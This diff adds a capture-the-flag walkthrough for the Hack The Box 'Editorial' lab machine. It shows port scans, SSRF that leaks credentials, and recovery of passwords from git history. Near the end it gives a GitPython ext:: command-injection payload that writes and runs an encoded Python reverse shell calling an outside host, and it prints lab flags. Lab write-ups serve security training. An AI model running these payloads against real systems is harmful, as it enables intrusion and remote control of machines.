@@ -1,0 +1,255 @@
+---
+title: Editorial
+banner: /avatars/editorial.webp
+difficulty: easy
+os: linux
+releaseDate: 2024-06-15
+pwnDate: 2024-06-22
+slug: "editorial"
+achievement: https://www.hackthebox.com/achievement/machine/701907/608
+user: [166,243,569,498,257,105,85,24,8,27]
+root: [166,210,461,330,231,101,74,30,9,29]
+---
+
+import Browser from "@/components/Browser.astro" 
+
+## Enumeration
+
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.20 -oG allPorts
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+```bash
+sudo nmap -p22,80 -sCV 10.10.11.20 -oN targeted
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
+|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://editorial.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+```
+
+```bash
+sudo sh -c 'echo "10.10.11.20 editorial.htb" >> /etc/hosts'
+```
+
+<Browser
+  url="editorial.htb"
+  src="/walkthroughs/editorial/0.png"
+/>
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://editorial.htb/FUZZ
+
+about                   [Status: 200, Size: 2939, Words: 492, Lines: 72, Duration: 408ms]
+upload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Duration: 257ms]
+```
+
+## Exploitation
+
+<Browser
+  url="editorial.htb/upload"
+  src="/walkthroughs/editorial/1.png"
+/>
+
+![SSRF api](/walkthroughs/editorial/2.png)
+
+```bash
+wget http://editorial.htb/static/uploads/505d9868-515a-42ef-bd63-9fdc41931d2d
+cat 505d9868-515a-42ef-bd63-9fdc41931d2d | jq
+```
+
+```json
+{
+  "messages": [
+    {
+      "promotions": {
+        "description": "Retrieve a list of all the promotions in our library.",
+        "endpoint": "/api/latest/metadata/messages/promos",
+        "methods": "GET"
+      }
+    },
+    {
+      "coupons": {
+        "description": "Retrieve the list of coupons to use in our library.",
+        "endpoint": "/api/latest/metadata/messages/coupons",
+        "methods": "GET"
+      }
+    },
+    {
+      "new_authors": {
+        "description": "Retrieve the welcome message sended to our new authors.",
+        "endpoint": "/api/latest/metadata/messages/authors",
+        "methods": "GET"
+      }
+    },
+    {
+      "platform_use": {
+        "description": "Retrieve examples of how to use the platform.",
+        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
+        "methods": "GET"
+      }
+    }
+  ],
+  "version": [
+    {
+      "changelog": {
+        "description": "Retrieve a list of all the versions and updates of the api.",
+        "endpoint": "/api/latest/metadata/changelog",
+        "methods": "GET"
+      }
+    },
+    {
+      "latest": {
+        "description": "Retrieve the last version of api.",
+        "endpoint": "/api/latest/metadata",
+        "methods": "GET"
+      }
+    }
+  ]
+}
+```
+
+![SSRF new_authors](/walkthroughs/editorial/3.png)
+
+```bash
+wget http://editorial.htb/static/uploads/16e0ad2c-3be1-4c8c-b05f-8e1c0a4a92c7
+cat 16e0ad2c-3be1-4c8c-b05f-8e1c0a4a92c7 | jq
+```
+
+```json
+{
+  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
+}
+```
+
+`dev:dev080217_devAPI!@`
+
+```bash
+-bash-5.1$ cat user.txt
+f0033e1bf3764f2d29bd0aa61bbdda71
+```
+
+##  Privilege escalation
+
+```bash
+-bash-5.1$ cd apps
+-bash-5.1$ ls -la
+total 12
+drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
+drwxr-x--- 6 dev dev 4096 Jun 22 19:36 ..
+drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
+```
+
+```bash
+git log -p
+```
+
+with the following command you will see only the commit that is relevant
+
+```bash
+git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
+    
+    * To use development environment.
+
+diff --git a/app_api/app.py b/app_api/app.py
+index 61b786f..3373b14 100644
+--- a/app_api/app.py
++++ b/app_api/app.py
+@@ -64,7 +64,7 @@ def index():
+ @app.route(api_route + '/authors/message', methods=['GET'])
+ def api_mail_new_authors():
+     return jsonify({
+-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
++        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+     }) # TODO: replace dev credentials when checks pass
+ 
+ # -------------------------------
+```
+
+`prod:080217_Producti0n_2023!@`
+
+```bash
+-bash-5.1$ su prod
+Password:
+```
+
+```bash
+bash-5.1$ sudo -l
+[sudo] password for prod: 
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3
+        /opt/internal_apps/clone_changes/clone_prod_change.py *
+```
+
+```bash
+bash-5.1$ cd /opt/internal_apps/clone_changes/
+bash-5.1$ pwd
+/opt/internal_apps/clone_changes
+```
+```bash
+bash-5.1$ cat clone_prod_change.py 
+```
+
+```python
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+```
+
+```bash
+bash-5.1$ pip3 list
+GitPython             3.1.29
+```
+
+[vulnerability in GitPython < 3.1.30](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)
+
+```bash
+bash-5.1$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c echo% cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjM5Iiw0MDAwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIikn% |% base64% -d% >% /tmp/reverse_shell.sh;% chmod% +x% /tmp/reverse_shell.sh"
+```
+
+```bash
+bash-5.1$ bash-5.1$ ls -l /tmp/reverse_shell.sh 
+-rwxr-xr-x 1 root root 225 Jun 23 08:23 /tmp/reverse_shell.sh
+```
+
+```bash
+nc -nlvp 4000
+```
+
+```bash
+bash-5.1$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c /tmp/reverse_shell.sh"
+```
+
+```bash
+root@editorial:/opt/internal_apps/clone_changes# cd /root
+root@editorial:~# cat root.txt
+70a3f7b33d13b576c24618c6e0befe32
+```
